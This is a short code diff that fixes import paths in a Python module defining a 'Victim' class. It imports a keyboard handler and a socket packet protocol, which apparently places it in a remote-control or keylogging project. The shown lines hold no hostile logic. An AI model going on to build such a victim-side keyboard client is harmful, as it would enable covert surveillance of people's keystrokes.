@@ -1,8 +1,10 @@
 import socket
+import sys
 import threading
+sys.path.append('..')
 
-from ..handelrs.keyboard_handelr import HandelKeyboard
-from ..protocol.protocol import HandelPacket, PacketType
+from handelrs.keyboard_handelr import HandelKeyboard
+from protocol.protocol import HandelPacket, PacketType
 
 
 class Victim:
